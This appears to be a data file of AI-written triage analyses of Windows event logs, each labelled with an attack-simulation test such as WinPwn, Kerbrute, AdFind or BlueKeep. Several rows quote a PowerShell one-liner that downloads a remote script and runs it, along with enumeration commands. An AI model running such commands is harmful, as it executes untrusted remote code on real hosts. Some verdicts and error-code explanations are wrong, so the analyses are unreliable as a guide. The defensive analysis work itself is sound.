The presence of PowerShell activity downloading scripts from a GitHub repository is particularly worrying. This behavior, combined with the execution chain visible in the Sysmon logs, suggests a higher risk of potentially malicious behavior. While the specific script being downloaded and executed (`script.ps1`) could serve legitimate purposes, its origin from an external source raises a red flag that needs immediate attention to verify its legitimacy.

### Resolution

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**: 
1. Investigate the GitHub repository and the specific script to determine its legitimacy and intended function.
2. Verify if the script is approved for use within the organization and check any related change management or automation tasks.
3. Search for any known security advisories or benchmarks referencing similar PowerShell activity.
4. Consider blocking external PowerShell script downloads if not required by policy and inspect systems for similar activity.
5. Ensure that endpoint protection is alerting or blocking scripting anomalies.
6. If necessary, perform a full security audit of affected systems to look for additional indicators of compromise.
"
WinPwn - DotNet,"Upon analyzing the provided Windows event logs, I identified several points of interest that suggest suspicious or potentially malicious activity:

1. **PowerShell Activity:**
   - Multiple PowerShell events (Event IDs: 600) indicate the execution of a command involving downloading and executing a script from a GitHub repository through `powershell.exe`.
   - The command: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')` suggests remote script execution, which is commonly seen in malicious activities.
   - The use of `iex` (Invoke-Expression) is often exploited by attackers to execute scripts that are downloaded from external sources.

2. **Potential Time Manipulation:**
   - Security log Event ID 4616 reports a modification in system time using `svchost.exe`. Unexpected time changes can be indicative of an attempt to evade detection or manipulate event log timestamps.

3. **Privilege Escalation:**
   - Security log Event ID 4672 shows the user `admin_test` receiving a set of high privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), indicating potential privilege escalation activity.
   - The logon event (Event ID 4624) shows the user `admin_test` logging in using NTLM authentication from a remote workstation (DESKTOP-3HL5B2P), which may be part of a lateral movement attempt.

4. **Sysmon Logs:**
   - Sysmon logs indicate several executions of `wevtutil.exe` by the user `admin_test`. The tool `wevtutil.exe` can be used to query event logs, and if misused, it can be leveraged to delete logs, suggesting attempts to cover tracks.

Taking into account these observations, particularly the suspicious PowerShell activity, potential time manipulation, and privilege escalation, the resolution for this log analysis is:

**Resolution: MALICIOUS**
- The logs exhibit indicators of compromise, particularly the unauthorized download and execution of scripts from external URLs, privilege escalation, and potential log tampering. There are strong signs of a security breach involving malicious activity.

**Guidance on How to Proceed:**
1. **Immediate Quarantine:** Isolate the host `Server002` from the network to prevent further propagation of potential threats.
2. **Forensic Investigation:** Retrieve a complete forensic image of the host for in-depth analysis of any additional malicious activities or persistence mechanisms not captured in these logs.
3. **Review Network Logs:** Check firewall, IDS/IPS, and network flow logs for unusual connections originating from the server, focusing on connections to external IPs related to the suspicious PowerShell Script.
4. **Containment and Remediation Plan:** Develop a plan to contain the threat and remediate the affected systems. This should involve a review of user accounts, especially `admin_test`, and strengthening security measures such as improving logging, monitoring, and access controls.
5. **Update Defenses:** Ensure all systems are fully patched, and update any antivirus or endpoint protection systems to prevent further exploitation.
6. **Report to Stakeholders:** Notify relevant stakeholders and authorities if applicable, due to potential unauthorized access and sensitive information exposure."
Process Discovery - get-wmiObject,"Upon analyzing the provided Windows event logs, several events and trends stand out as noteworthy:

### Detailed Analysis:

1. **Time Manipulation Events (System Log & Security Log):**
   - There are multiple events associated with time changes in the system log (`EventID: 1` and `EventID: 24` from `Microsoft-Windows-Kernel-General`) and corresponding events in the security log (`EventID: 4616`). Time manipulation can be a benign administrative action; however, it's crucial to verify its legitimacy. Time changes are being made by `svchost.exe` under the `NT AUTHORITY\LOCAL SERVICE` account. This could warrant further investigation to rule out attempts to evade audit logs.

2. **Sysmon Log Entries:**
   - Multiple Sysmon events (`EventID: 5`) indicate the execution of utilities like `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. 

   - The execution of `wevtutil.exe`, a command-line utility used for managing event logs, can potentially be suspicious as it might be used to clear logs — a typical post-exploitation activity. However, there is no direct evidence of malicious intent in the current logs.

3. **PowerShell Activity (Windows PowerShell Log & Sysmon Log):**
   - `PowerShell.exe` was executed with a command to retrieve WMI objects (`get-wmiObject -class Win32_Process`). While not inherently malicious, the execution of PowerShell with system-level capabilities could point to either administrative tasks or potential reconnaissance efforts.

4. **Privilege Escalation (Security Log):**
   - There are events (`EventID: 4672`) indicating special privileges granted to the user `admin_test`. The privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`, among others. Though this can be usual in certain administrative contexts, combining this with other behavior raises the level of suspicion.

5. **Login Activity (Security Log):**
   - Logon events (`EventID: 4624`) show NTLM logins by `admin_test`, which might indicate authorized remote management. However, tracking the source IP (`IP Address: fe80::866a:d1f8:8d06:7bc`) should confirm if the access is legitimate.

### Assessment of the Situation:

- The logs present a mix of potentially benign administrative tasks and signs that could be suggestive of suspicious activity:
  - Time changes might seem innocent but should be verified, especially for context around the time it occurred.
  - The use of system utilities and PowerShell commands can be part of routine maintenance but may also be reconnaissance or preparation for malicious exploitation.
  - Elevated privileges granted to `admin_test` are typical for administrative users, but combined with other behaviors, they warrant checking if this account’s actions are within expected operational procedures.

### Resolution:

- **SUSPICIOUS** - The logs contain activities that, while not directly confirming malicious actions, do not look entirely right. This includes:
  - Time alteration that could be used to hide actions.
  - Potential misuse of PowerShell and elevated privileges.
  - The use of administrative utilities that require confirmation as non-malicious.

### Guidance on How to Proceed:

1. **Verify Legitimacy of Time Changes**: Investigate any administrative actions or scheduled tasks around the time changes.
2. **Review Admin Activities**: Confirm the legitimacy of `admin_test` account actions and cross-verify with expected maintenance tasks.
3. **Check Source of Logons**: Validate if the logon events, particularly from the identified IP addresses, are legitimate.
4. **Consult Event Logs Around This Time**: Look for any cleared logs or inhibited logging, especially if `wevtutil.exe` was used to manipulate logs.
5. **Consider MDR or EDR Solutions**: Employ advanced security tools for historical context and deeper analysis of system behavior.

By following these steps, you can determine whether further action is necessary or if the activity is indeed benign."
System Network Connections Discovery,"Upon analyzing the provided Windows event logs, several entries suggest the need for further scrutiny due to potentially suspicious activities:

### Analysis:

1. **Sysmon Log:**
   - Multiple executions of `whoami.exe`, `cmd.exe`, `netstat.exe`, `net.exe`, and `wevtutil.exe`. While these tools are legitimate, their use in quick succession, especially from the `cmd.exe` shell with arguments such as `netstat`, `net use`, and `net sessions`, can indicate reconnaissance or lateral movement activities.
   - The `wevtutil.exe` utility is often used to query and manage event logs, which could be a mechanism to hide evidence of malicious activity.
   - The command line execution of `cmd.exe` with network-related command arguments from a high integrity level suggests a user with administrative privileges performing potentially unauthorized network enumeration.

2. **Security Log:**
   - Event ID 4624 indicates successful logon events involving the `admin_test` user account using NTLM authentication from external hosts. While NTLM is a standard authentication protocol, repeated successful logins with high privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and other administrative rights can potentially suggest a compromised account or a misuse of privileges.

3. **Application and Other Logs:**
   - The detected activity and process executions by `Microsoft Edge Installer` could be expected behavior if triggered by a legitimate system update. However, given the context of the other logs, monitoring for unauthorized uses of software installation processes could be prudent.

### Assessment:

Given the sequence and the context of these activities—where a series of network-related commands and potential event log manipulations are carried out by an account with elevated privileges—this pattern can be indicative of possible malicious reconnaissance or lateral movement within the network.

### Recommendation:

1. **Resolution: SUSPICIOUS**
   - Although the activity is not overtly malicious, the combination of privilege use, command executions, and tools involved suggest behavior that is suspicious and warrants further investigation.
  
2. **Action Items:**
   - **User Verification:** Validate whether the `admin_test` account's actions align with expected behavior. Confirm whether these activities were sanctioned by the system's legitimate administrators.
   - **Network Monitoring:** Examine network traffic during these events for unusual patterns or unauthorized data exfiltration.
   - **Log Review:** Scrutinize the logs around the timeframe of these events for additional anomalies or indicators of compromise.
   - **Security Audit:** Conduct a comprehensive audit of user accounts and permissions, especially focusing on those with elevated privileges.
   - **Endpoint Protection:** Ensure endpoint protection solutions are updated and configured to actively monitor for further suspicious activities.

By taking these steps, you can better ascertain if there is a security breach and take appropriate remedial actions to secure the network and systems involved."
WinPwn - General privesc checks,"In reviewing the provided event logs, several indicators suggest potentially malicious activity. Here's a detailed analysis of the log entries:

1. **Windows PowerShell Logs:**
   - The logs show repeated execution of PowerShell with a command intended to download and execute a script from a GitHub URL (`https://raw.githubusercontent.com/script/script/.../script.ps1`). This behavior is suspicious because downloading scripts from external repositories and executing them could indicate an attempt to run unauthorized and potentially malicious code. This technique is commonly used in fileless malware and attacks.

2. **Sysmon Logs:**
   - The Sysmon logs include multiple entries of PowerShell execution, which matches the activity indicated in the PowerShell logs.
   - There are also numerous executions of system utilities like `wevtutil.exe` and `conhost.exe`. While `wevtutil.exe` is typically used for legitimate administrative tasks, frequent use in a short span, especially if executed by different processes, might suggest log tampering or cleaning attempts, a tactic used by attackers to cover their tracks.

3. **System and Security Logs:**
   - There are multiple indications of time adjustments (`Kernel-General` and `Time-Service` logs) within milliseconds, which suggests possible attempts to manipulate system time, potentially to evade detection mechanisms or alter log timestamps. While not conclusive on its own, in conjunction with other suspicious activities, this warrants further investigation.

4. **Microsoft Edge Update Activity:**
   - There are numerous activities related to Microsoft Edge Update. While updates can be legitimate, it is important to verify these specific entries against scheduled update times and sources officially sanctioned by the organization.

**Assessment:**
The behavior noted, particularly executing external scripts from the internet and possible log manipulation, align with techniques often observed in malicious activities. The activity appears to be conducted by the user ""SERVER002\\admin_test,"" which might suggest either legitimate activity or a compromised account.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Isolate and Investigate:** Immediately isolate the machine (Server002) from the network to prevent further potential spread or exfiltration.
2. **Detailed Forensics:** Conduct detailed forensic analysis on Server002, focusing on network logs, process trees, and disk images to determine if the script was executed and its subsequent impact.
3. **Credential Check:** Verify the credentials and access logs for ""SERVER002\\admin_test"" to ensure that it hasn’t been compromised.
4. **Review Update Logs:** Cross-check the Edge update events with official update schedules to confirm their legitimacy.
5. **Increase Monitoring:** Enhance monitoring of PowerShell and similar tools on other systems to quickly identify similar behavior, adapting detection rules if necessary.

Additional investigation is indeed necessary to confirm the intent and impact of the observed activity and mitigate any potential threats."
Adfind - Enumerate Active Directory User Objects,"**Detailed Analysis:**

The provided Windows event logs include entries from Application, Sysmon, Security, and PowerShell logs to analyze for potential indicators of malicious activity.

1. **Application Log:**
    - Events show activities related to the Software Protection Platform, Windows Defender state, and EdgeUpdate service stopped. These entries on their own do not indicate any obvious malicious activities. They simply reflect normal operations and updates.

2. **Sysmon Log:**
    - There is a consistent pattern of command executions and processes associated with 'MicrosoftEdgeUpdate.exe', 'SecurityHealthService.exe', 'whoami.exe', and 'hostname.exe'. Notably:
        - Execution of `wevtutil.exe`, `cmd.exe`, and `AdFind.exe` via a command prompt indicates potential for reconnaissance activities. The AdFind tool is often used for AD enumeration, which could be legitimate in some contexts but potentially suspicious if unexpected.
        - The usage of `AdFind.exe` with the `-f (objectcategory=person)` filter suggests an attempt to query Active Directory for users, which could be related to account enumeration.
    - The combination of these processes, particularly with `cmd.exe` executing a potentially suspicious tool from a user temp directory, raises a red flag.
      
3. **Security Log:**
    - Event ID 4624 indicates a successful logon with logon type 5, which is a service logon, not inherently suspicious.
    - Event ID 4672 indicates an account logging in with special privileges, granted to the NT AUTHORITY\SYSTEM account. This is expected for system accounts and services and does not immediately suggest malicious behavior.

**Indicators of Potential Compromise:**
- **Execution of Suspicious Commands:** The presence of `cmd.exe` issuing a command for `AdFind.exe` is particularly concerning. This specific executable is a well-known tool used for Active Directory enumeration, often seen in penetration testing and attacks that involve gaining knowledge of the network environment.

**Conclusion:**
- **Resolution: SUSPICIOUS**

**Assessment:**
The logs present several behaviors that are concerning, especially the use of AdFind for directory queries, in conjunction with other command-line executions that could be part of a reconnaissance phase in an attack cycle. However, without further context, it cannot be definitively declared as malicious activity.

**Guidance:**
1. **Investigate the Context:** Verify if the execution of AdFind and the other activities align with any authorized IT activities or penetration tests.
2. **Review User Activity:** Check if the user 'SERVER002\admin_test' has been involved in any other suspicious actions or reported incidents recently.
3. **Monitor and Alerting:** Increase monitoring of similar activities across other systems to check for lateral movement and set up alerts for the execution of known reconnaissance tools.
4. **Contact Users:** Liaise with the account holders (particularly 'admin_test') to understand their routine operations and validate if this activity was intentional. 

Based on the findings and user confirmations, further actions may be taken, including isolating the system for an in-depth analysis if unauthorized behavior is confirmed."
Wevtutil - Discover NTLM Users Remote,"## Detailed Analysis of Windows Event Logs

### Observations:

1. **PowerShell Activity:**
   - Multiple instances of PowerShell activities logged. The command line observed is executing a script to determine a target IP address using the environment variable `LOGONSERVER`, and subsequently using `wmic` to execute `wevtutil` to export Security logs related to EventID 4776, which is related to NTLM Authentication.
   - The PowerShell script seems to be executing remotely on different nodes specified by IP address or hostname.

2. **Sysmon Logs:**
   - There is a consistent execution pattern involving `whoami.exe`, `conhost.exe`, and `wevtutil.exe`, initiated by a PowerShell script. These applications are run under a high integrity level by the user `SERVER002\admin_test`.
   - The process chain initiated by PowerShell and the commands executed by `wmic` indicate potential intent to export or manipulate log files, especially security event logs. 
   - The `MicrosoftEdgeUpdate` related processes are legitimate as they show expected behavior corresponding to updates and service checks.

3. **Time Change:**
   - There is a discrepancy in the system time detected and adjusted, which can indicate time-related manipulations. Time changes were detected in both kernel and security logs, with backdating of system time evident. This is suspicious in the context of log alteration or hiding tracks of malicious activities.

### Assessment:

- The use of PowerShell scripts to alter or export security logs, especially ones containing sensitive authentication events, indicates potentially **malicious intent**. The intention to extract or manipulate EventID 4776 (related to NTLM authentications) is particularly concerning.
- The high integrity level under which these scripts are executed and the manipulation of system time further support the likelihood of malicious activity aimed at evasion or evidence manipulation.
- Regular Windows activities such as Edge updates or service activities do not raise concerns independently, but in tandem with observed PowerShell usage and security log exports, warrant suspicion.

### Resolution:

- **MALICIOUS** - The evidence strongly indicates malicious activity due to unauthorized PowerShell scripts attempting to manipulate security logs, along with suspicious time tampering efforts on the system.

### Guidance on How to Proceed:

1. **Immediate Response:** 
   - Isolate the affected machine from the network to prevent further potential malicious activities.
   - Conduct a full malware scan and integrity checks to identify any unauthorized changes or malware presence.

2. **Advanced Investigation:**
   - Review access logs and authentication attempts to verify if unauthorized access was achieved prior to observed actions.
   - Conduct forensic analysis on the event log files to determine whether logs have been tampered with or illegitimately exported.

3. **Long-term Mitigation:**
   - Implement stricter PowerShell execution policies to restrict script execution to authorized administrators only.
   - Enhance monitoring on the use of sensitive administrative tools like `wmic`, `wevtutil`, and any security-critical logs.
   - Review and tighten access controls, especially concerning access to security event logging mechanisms and high-privilege accounts."
List Mozilla Firefox bookmarks on Windows with command prompt,"After thoroughly analyzing the provided Windows event logs, here are the findings from each log entry:

### Windows PowerShell Log
Unfortunately, there are no entries here. Typically, PowerShell log entries would aid in identifying suspicious command execution, script actions, and potential exploit attempts.

### Application Log
1. **Software Protection Platform Service**: Regular entries regarding the security software protection platform.
2. **Edge Update and Security Center**: The service stop entries for edgeupdate are normal behavior during update processes. The log shows that Windows Defender is active, which is standard.

### Security Log
1. **Logon Events (Event ID 4624)**: Logon Type 5 indicates a service logon, which is typical for scheduled or automated tasks on a server system.
2. **Special Privileges Assigned (Event ID 4672)**: SYSTEM account used, indicating high privilege tasks, likely for system maintenance. These privileges are expected in a SYSTEM context.
3. **Account Enumeration (Event ID 4798)**: Audit of security principal enumeration is observed. While frequent, these logs do not indicate direct malicious activity themselves but could be reviewed for context in response to other suspicious activity.
4. **Credential Validation**: Several ""MicrosoftAccount"" and Windows Live token interactions exhibited unsuccessful operations (`ReturnCode: 3221226021`), which in itself is not directly indicative of malicious activity but worth observing for unusual patterns.

### Sysmon Log
1. **Process Creation (Event ID 1)**: A variety of standard processes were seen including HOSTNAME.EXE, WHOAMI.EXE, cmd.exe, and tasks related to Windows updates. These look normal for maintenance and querying tasks.
2. **File Creation (Event ID 5)**: Frequent ""MicrosoftEdgeUpdate"" processes were running, which ties into consistent update behavior. No non-standard paths or file creations were observed.
3. **Edge Update**: Numerous entries surround Microsoft Edge updating, including download and service events which appear to be regular maintenance.

### System Log
1. **Time Service (Event ID 35)**: Indicates synchronization with an NTP server, which is routine system operation for maintaining accurate time across network devices.

### Conclusion
Across the analyzed logs, no explicit indicators of malicious activity, such as unusual or unexpected process executions, privilege escalations, or actions with files, are present. All observed activities appear to reflect routine system maintenance and update operations, including Microsoft Edge updates and standard Windows services activity.

### Resolution
**RESOLUTION: BENIGN** - The log files reviewed contain benign activity. Continuous monitoring is recommended to ensure that this pattern remains consistent and to detect any deviations from typical behavior. If specific anomalies are noted in conjunction with these activities, a deeper investigation may be warranted."
Kerbrute - userenum,"Based on the provided logs, let's break down the potential indicators of compromise or suspicious activity:

### Key Observations:

1. **Frequent Use of PowerShell:**
   - There are multiple instances of `powershell.exe` being run with a command that includes executing a script (e.g., `script.exe userenum`). The command also appears to reference external files and enumerates user information. This could potentially indicate malicious activity, such as enumeration or preparation for lateral movement.

2. **Use of wevtutil Tool:**
   - There are several occurrences of `wevtutil.exe` being executed. `wevtutil` is commonly used to manage event logs. Its frequent usage alongside `conhost.exe` by the `admin_test` user account could be suspicious, especially if it is not typical behavior for the given environment.

3. **Security Privileges:**
   - The logs indicate SYSTEM privileges with entries like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, which, while normal for some operations, can be abused if hijacked by malicious actors.

4. **Execution of Script via PowerShell:**
   - The command line usage in PowerShell is attempting to enumerate the user information. This can be benign if done for legitimate purposes, such as administrative tasks, but can also be indicative of reconnaissance activities if unexpected.

5. **Event Log 5379 - Credential Validation Failures:**
   - Multiple credential-related operations are failing with ReturnCode `3221226021` across different logs. Although the actual logon attempts or credential usage are not shown as successful, repeated failures might suggest a brute force or script malfunction.

6. **Process Activity:**
   - Including legitimate processes like `TrustedInstaller.exe`, `SecurityHealthService.exe`, and telemetry runners, as seen in these logs. They appear to be functioning as expected and are part of regular Windows operations.
   
### Conclusion:
- **Risk Assessment:**
  - The use of PowerShell to enumerate user information and the repeated execution of `wevtutil.exe` with the `admin_test` account suggest potentially suspicious activities. However, without further context, such as expected activities for this user or system, it's not possible to definitively label this as malicious.

- **Next Steps:**
  - Review and confirm the legitimacy of the `powershell.exe` script being executed.
  - Investigate the `admin_test` account's purpose and history to ascertain whether these actions correlate with expected behaviors.
  - Monitor and potentially restrict the use of PowerShell and `wevtutil.exe` based on necessity.
  - Look for other correlated indicators on the network for unauthorized access attempts or lateral movement.

### Resolution:
- The activities contain certain anomalies that suggest they may not be purely benign, requiring further investigation to rule out misuse or potential compromise. Therefore, the safest conclusion for this analysis is:

**SUSPICIOUS** - Logs contain activity that doesn't look right and needs more investigation."
WinPwn - bluekeep,"### Analysis:

#### Security Logs:
- **EventID 4616** indicates a change in the system time, which can be a marker of malicious activity if not scheduled as part of maintenance.
- **EventID 4634 and 4624** show a logoff and logon respectively from the account `admin_test`. The login type is 3 (network), which suggests this was a remote login. These events are normal for network connections if they are from a trusted source.
- **EventID 4672** multiple times for `admin_test` shows special privileges granted, which includes sensitive privileges such as `SeDebugPrivilege`. These privileges are commonly targeted by attackers for malicious uses.
  
#### System Logs:
- Changes in system time (`EventID 1`) are seen, consistent with the Security logs. Time changes should be investigated especially if they occur out of maintenance windows.

#### Application Logs:
- **Event of 'Windows Defender, SECURITY_PRODUCT_STATE_ON'** which indicates that Windows Defender is active and running, could mean some form of protection is in place. However, it doesn't state if an active scan has been performed.

#### Sysmon Logs:
- **Process Creation Events** show common processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` which could be benign but sometimes used in malicious activities as reconnaissance or maintaining access.
- **PowerShell Execution** indicates an attempt to run a script downloaded from GitHub, which could be used for malicious purposes. The use of such a URL with PowerShell to execute a script raises a serious suspicious indicator.

#### PowerShell Logs:
- **BlueKeep Reference**: Repeated logs of PowerShell execution with the `bluekeep` mention indicate a potential BlueKeep vulnerability attack attempt. This is a Remote Desktop Protocol (RDP) vulnerability and an active exploitation strategy.

### Assessment:
- **Privilege escalation attempts and logging actions** with sensitive privileges look suspicious.
- **PowerShell script execution from an external source** indicates potential malicious intent.
- **Modification of system time** which could be an attempt to delete or mask activities.

### Resolution: **MALICIOUS**

Given the evidence of privilege escalation, suspicious remote PowerShell script execution, and system time tampering, these logs strongly suggest malicious activity. Immediate action is recommended to:
1. Isolate the affected machine from the network.
2. Initiate a full forensic investigation.
3. Audit all user account activities, especially non-typical logons.
4. Review Active Directory for anomalies.
5. Patch the BlueKeep vulnerability and ensure all systems are updated with recent security patches."
Process Discovery - tasklist,"After analyzing the provided Windows event logs, here is a detailed assessment of the situation:

**System and Security Logs Analysis:**
1. **Time Change Events**: There are multiple events indicating a change in system time (EventID 24 and 1 from the `Microsoft-Windows-Kernel-General` and EventID 4616 from `Microsoft-Windows-Security-Auditing`). These events show both the old and new system time. Time changes can be suspicious if unauthorized, as they could be used to manipulate timestamps in logs to cover malicious activity. However, in this context, the time adjustments could be related to standard time synchronization processes with `time.windows.com`.

2. **Services**: The presence of `svchost.exe` and other service-related executables (`sppsvc.exe`, `TrustedInstaller.exe`) running under the `NT AUTHORITY` user does not inherently indicate malicious activity. These are legitimate Windows processes often associated with system services.

**Sysmon Logs Analysis:**
1. **Process Execution**: There are several executions of typical administrative and system-related commands and utilities such as `whoami.exe`, `hostname.exe`, `cmd.exe`, `tasklist.exe`, and `wevtutil.exe`. These utilities are common for administrative tasks, and their usage by the user `SERVER002\admin_test` suggests that a user with administrative privileges was likely performing system checks or maintenance.

2. **Wevtutil Executions**: Frequent execution of `wevtutil.exe` could indicate log manipulation attempts to clear or query event logs. However, there is no direct evidence of log clearing commands.

3. **Unusual Process Hierarchy with wsmprovhost**: The presence of processes `whoami.exe`, `hostname.exe`, and `tasklist.exe` with `wsmprovhost.exe` as a parent image suggests activity through the Windows Remote Management Protocol, which could be part of normal system administration tasks.

**Application Log Analysis:**
1. **SPP Service Log**: There is an entry related to the Software Protection Platform Service, which is a regular Windows service related to software licensing.

**Assessment:**
- **Benign Indicators**: Multiple `svchost.exe` instances and SPP logs do not show malicious activity.
- **Potentially Suspicious Activity**: The multiple time changes and executions of system binaries like `wevtutil.exe` can have benign explanations but warrant closer scrutiny to rule out malicious intent.
- **Malicious Indicators**: None definitive at this stage, but the pattern of activity raises some flags.

**Resolution:**
- **SUSPICIOUS**: The logs show activities that could be typical administrative tasks, but the pattern of use, especially the frequent time changes and possibly unauthorized administrative tool executions, is inconsistent with normal operations without additional context. Further investigation into who performed these actions and why, especially around time-setting and log utility usage, is recommended.

**Guidance:**
1. Verify with the user `SERVER002\admin_test` or related administrators whether these actions were part of legitimate system maintenance tasks.
2. Investigate the necessity and context for time changes and executions of `wevtutil.exe`.
3. Scrutinize access logs and user activities around the time of these events for any unauthorized access or anomaly.
4. Consider deploying additional security monitoring and alerts for such activities in the future."
Applications Installed,"After analyzing the provided Windows event logs, here is my assessment:

### System Log Analysis
1. **EventID 24, EventID 1**: These events from the Microsoft-Windows-Kernel-General indicate minor adjustments in system time. The `svchost.exe` process with Process ID 6708 is responsible for these changes. Changes in system time can sometimes indicate an attempt to manipulate temporal data for malicious purposes, but in this case, it seems normal as the time source is legitimate (time.windows.com).

### Windows PowerShell Log Analysis
2. **PowerShell Activity**: The PowerShell events indicate a script is being run to query registry keys for installed software details. The presence of Windows PowerShell activity isn't unusual by itself, but if this activity is unexpected (for example, not scheduled or not part of regular IT tasks), it could warrant further review to ensure the scripts executed are authorized and expected.

### Security Log Analysis
3. **EventID 4616**: Time change events logged by `svchost.exe` under the NT AUTHORITY\LOCAL SERVICE account. There aren't any direct indicators of malicious activity in these events, especially given the correlation with time synchronization activities.

### Sysmon Log Analysis
4. **Process Creation and Connections**:
   - Many process creations for `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `conhost.exe`. These are standard system utilities and processes. Their use with high integrity level by an admin user (""admin_test"") suggests they were invoked by an admin or through some automated script. However, there’s a substantial number of these rapid process invocations within a short time frame, which can sometimes indicate a script or automation task run.
   - `whoami.exe` and `hostname.exe` are often used for gathering information during penetration testing or by system administrators during troubleshooting. These instances are not definitively unusual, but frequent invocation might be questioned if not inline with expected tasks.

### Conclusion
- **BENIGN**: The log entries overall show relatively benign behavior with respect to routine system operations and administrative tasks. The PowerShell startup and commands, system time adjustments, execution of `hostname.exe` and `whoami.exe`, and registry access are consistent with administrative or automated system activity. If these processes and activities align with planned maintenance or administrative tasks, they pose no threat.
  
### Guidance
- **Review Authorization**: Ensure the PowerShell scripts and their context are part of authorized activities.
- **Monitor Frequency and Context**: Although each event appears standard, the frequency of specific commands should be monitored to ensure they are executed within expected operational context.
- **Security Audit Logs**: Regular reviews and audits of Windows event logs and correlated activities should continue to confirm no unexpected changes occur over time.

No immediate threats were identified based on the logs provided, but continue to apply due diligence through regular log reviews and maintaining accessibility to logs for historical analysis when needed."
Enumerate Active Directory Computers with Get-AdComputer,"Upon reviewing the provided Windows event logs, the following detailed analysis is presented:

1. **SecurityCenter Logs:**
   - The Application log entry indicates that Windows Defender is active on the system (`SECURITY_PRODUCT_STATE_ON`). This shows that antivirus protection is enabled, which is a positive indicator for system security.

2. **Windows Update Logs:**
   - Multiple System log entries show the Windows Update Client updating Microsoft Defender Antivirus definitions (KB2267602). This is expected behavior as these updates are critical for maintaining up-to-date security signatures.

3. **Sysmon Logs:**
   - The Sysmon logs show several benign activities:
     - Execution of system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and regular operations of system processes.
     - General invocation of PowerShell, which lists scripts but no suspicious command lines.
     - The execution of `wuauclt.exe` as part of ongoing system updates aligns with legitimate update processes.
   
   - One entry to note is `powershell.exe` being invoked with a `script -Filter *` command. Without more context, this PowerShell command does not inherently seem malicious, but automation or specific scripting purposes might not be commonly tracked in logs. However, no evident malicious command execution or suspect payload delivery is apparent from this trace.
   
   - The subsequent PowerShell log corresponds with the Sysmon log and shows typical PowerShell operations, such as starting and stopping various providers, not indicating explicit malicious use.

4. **Security Logs:**
   - Entries with Event ID 5379 are observed showing Credential Validation failure for `MicrosoftAccount:user=02txoixylodcstop`. The Return Code `3221226021` translates to ""STATUS_NO_SUCH_LOGON_SESSION"", likely indicating a failed connection to a Microsoft account. This by itself is not a direct sign of compromise but can be routine if someone or a script incorrectly attempts or handles Microsoft account connections.
   
5. **Windows PowerShell Logs:**
   - Windows PowerShell logs list that a script intended to filter is tentatively initiated but no specific, executable command components are visible to suggest hostile intent.

**Assessment:**
- The logs reviewed primarily reflect routine activities related to system updates and standard diagnostics, consistent with a scheduled maintenance window or regular automated tasks.
- The PowerShell activity does not explicitly indicate malicious use without additional context on the invoked script content.

**Conclusion: Benign**
The logs do not currently contain distinct signs of malicious activity or compromise. While some entries, particularly PowerShell execution with undefined specifics, warrant a degree of scrutiny, they do not demonstrate malicious behavior based on the available log data.

**Guidance:**
- Continue routine monitoring and ensure security logging captures broader context in the event of escalation.
- If external indicators or intelligence suggest PowerShell usage, an inspection of the scripts employed might be prudent for peace of mind."
Network Share Discovery command prompt,"After conducting a detailed analysis of the provided Windows event logs from various sources (Application, Sysmon, System, and Security logs), I have observed the following behavior and indicators:

### Application Logs
- The logs show events related to the stopping of the ""edgeupdate"" service and entries related to the Software Protection Platform Service. These services are typically related to routine maintenance and updates and do not, by themselves, indicate malicious behavior.

### Sysmon Logs
- Numerous entries indicate frequent execution of processes like `wevtutil.exe`, `conhost.exe`, and `MicrosoftEdgeUpdate.exe`. The `MicrosoftEdgeUpdate.exe` and associated processes are related to Microsoft Edge updates, which are routine maintenance tasks and do not inherently suggest malicious activity.
- The use of legitimate system executables, such as `wevtutil.exe` and `conhost.exe`, is not unusual. However, if these were hijacked by malicious scripts, it could have been a concern, but nothing in the logs associates them with known malicious patterns.
- `cmd.exe` is invoked with commands that might be used for standard network enumeration (e.g., `net view \\localhost`). While `cmd.exe` and network enumeration can sometimes be indicative of malicious activity, this alone is not sufficient to definitively categorize this as a threat without additional indicators (e.g., suspicious network traffic, logons, external communications).

### System Logs
- Time changes via svchost.exe are noted but show normal synchronization with a time server (`time.windows.com`). Time adjustments can sometimes correlate with malicious activity trying to evade detection, but given the context, this seems to be routine time-synchronization.

### Security Logs
- The security logs show typical login and privilege escalation events for a user `admin_test` on the system `SERVER002`. The presence of privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., might be concerning in other contexts, but these elevated privileges are common for administrative accounts and, alone, do not indicate malicious intent.

### Overall Assessment
- **BENIGN**: Upon reviewing the logs, all observed activities are consistent with legitimate software and administrative functions. The processes examined are common for system and application updates and maintenance, which is typical in enterprise environments. No explicit threat, compromise, or malicious activity indicators were found in these logs.

### Guidance
- Regular monitoring should continue, with particular attention to any changes in typical behavior patterns of system and application processes. Additional network monitoring and endpoint detection would strengthen your overall security posture to catch anything suspicious external to these logs.
"
System Information Discovery (2),"The analysis of the provided event logs reveals a series of activities conducted by a user account named ""admin_test"" on ""Server002."" Here are the key observations:

1. **Process Execution Patterns**:
   - There are multiple instances of command-line utilities like `cmd.exe`, `wevtutil.exe`, `whoami.exe`, and `wscript.exe` being executed repeatedly in a short time frame.
   - Most notably, `cmd.exe` is being used to execute various commands, including:
     - Exporting registry settings: `reg export ""HKLM\SYSTEM\CurrentControlSet\Control\Winlogon\Notifications""`
     - Collecting group policy results: `gpresult /scope:computer /v`
     - Collecting network information via a script (`gatherNetworkInfo.vbs`), which includes commands like `net config srv` and `net share`.
   - PowerShell execution (`powershell.exe`) with complex commands aimed at gathering extensive system and network configuration details.

2. **Indicators of Information Gathering**:
   - Command executions like `wmic qfe` (queries hotfix/patch data), `netsh wfp show netevents`, and `netsh wfp show state` are often used for obtaining detailed configuration data and may suggest data reconnaissance activities. 
   - These activities are indicative of scripts potentially being used to gather system information extensively.

3. **Security and System Logs**:
   - Several security log events (Event ID 4624 and 4672) indicate repeated successful logons for the USERID S-1-5-18, suggesting SYSTEM-level activities. This is observed during the same timeframe as the command executions.
